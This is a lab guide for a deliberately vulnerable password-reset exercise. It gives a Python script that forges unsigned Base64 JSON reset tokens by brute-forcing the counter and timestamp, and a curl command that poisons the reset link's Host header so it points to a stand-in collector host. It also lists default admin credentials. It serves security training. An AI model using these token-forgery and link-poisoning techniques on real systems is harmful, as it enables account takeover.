# Password reset exercise

This flow is deliberately vulnerable. It uses the existing customer accounts and
changes the same password used by `/login/` and HTTP Basic authentication.

Open `/forgot-password` and submit a registered username. An email addressed to
that customer's stored email address appears at `/admin/emails`. Sign in to the
outbox using the existing admin credentials (`admin` / `admin123!` on a fresh
installation). The purchase admin page also links to the outbox. Open the email's
link and submit a new password to complete a normal reset.

Tokens and emails live in memory in one application instance and clear on restart.
Each account has one active token; requesting another replaces it. Tokens have no
time limit and can be used once. Unknown or disabled usernames receive the same
confirmation but do not create an email or advance the counter.

The token is compact UTF-8 JSON encoded with URL-safe Base64, without padding:

```json
{"user":"attacker","token":1,"timestamp":1792252800}
```

`user` is the intended username, `token` is a global counter starting at 1, and
`timestamp` is the issuance time in Unix seconds (UTC). The JSON is unsigned. The
server matches the complete encoded value against the issued token, so all three
fields must match, including the timestamp. Keep the field order shown above and
omit spaces when forging candidates. Changing just the username or counter is
insufficient. URL-safe Base64 uses `-` and `_` instead of `+` and `/`.

## Forge the victim's token

Register two customer accounts, such as `attacker` and `victim`. Request a reset
for the attacker and read only that account's email in the lab outbox. Decode its
token to learn the format and current counter. Then request a reset for the
victim. With no intervening reset requests, the victim's counter will be the
attacker's counter plus one. Forge candidate JSON values with the victim's
username and that next counter, varying the timestamp over the few seconds
around the victim's reset request. If other resets occur, try a small counter
range as well.

Each candidate must be serialized as compact JSON and URL-safe Base64-encoded
without padding before submitting it as the `token` form field to
`POST /reset-password`, alongside a `password` field. Invalid candidates return
HTTP 400; the matching candidate returns HTTP 200 and changes the password.
The outbox is a lab aid for viewing the attacker's email; this attack does not
require viewing the victim's email.

This Python example uses only the standard library and targets the local dojo.
First request the attacker's reset in the browser. Copy its token from the
outbox, save the following code as `/tmp/forge-reset.py`, and run
`python3 /tmp/forge-reset.py`. The script asks for that
token, requests the victim's reset, and searches a small timestamp and counter
window. It assumes the app and your machine have synchronized clocks. Adjust
`origin`, `victim`, and `password` for your local setup.

```python
import base64
import json
import time
import urllib.error
import urllib.parse
import urllib.request

origin = "http://localhost:8080"
victim = "victim"
password = "dojo-new-password"
own_token = input("Attacker reset token: ").strip()
own = json.loads(base64.urlsafe_b64decode(own_token + "=" * (-len(own_token) % 4)))


def post(path, fields):
    request = urllib.request.Request(
        origin + path,
        data=urllib.parse.urlencode(fields).encode(),
        headers={"Accept": "text/html"},
    )
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            return response.status
    except urllib.error.HTTPError as error:
        if error.code != 400:
            raise
        return error.code


first_second = int(time.time()) - 2
assert post("/forgot-password", {"username": victim}) == 200
last_second = int(time.time()) + 2
found = False
for counter in range(own["token"] + 1, own["token"] + 4):
    for second in range(first_second, last_second + 1):
        payload = {"user": victim, "token": counter, "timestamp": second}
        raw = json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode()
        candidate = base64.urlsafe_b64encode(raw).decode().rstrip("=")
        if post("/reset-password", {"token": candidate, "password": password}) == 200:
            print("Password changed with candidate:", payload)
            found = True
            break
    if found:
        break
if not found:
    print("No match. Check the clock window, counter range, and victim username.")
```

For an Intruder exercise, generate the same compact JSON candidates with varying
counter and timestamp values, encode each with URL-safe Base64 without padding,
and use the encoded values as the reset request's `token` payloads. The successful
request changes the password and consumes the token.

## Poison the reset link

The email's absolute reset URL trusts the request's `Host` header. Send a reset
request for the victim while replacing that header with a server you control:

```sh
curl -H 'Accept: text/html' -H 'Host: collector.example.test:9000' \
  -d 'username=victim' http://localhost:8080/forgot-password
```

The victim's email now links to
`http://collector.example.test:9000/reset-password?token=...`. Use a reachable
collector address for a live exercise. When the victim follows that email link
from the lab outbox, their browser sends the token to the collector in the URL.
The collector can then submit the captured token to the real store's
`/reset-password` endpoint. The application does not automatically visit links;
the exercise requires the simulated victim to click the email link.

The supplied NGINX proxy passes the original Host header to the app. Its existing
virtual host rules still apply: the simplest Host poisoning exercise targets the
app's exposed HTTP port directly. The URL scheme comes from the app's request,
so TLS terminated at the proxy can produce an `http` reset link.
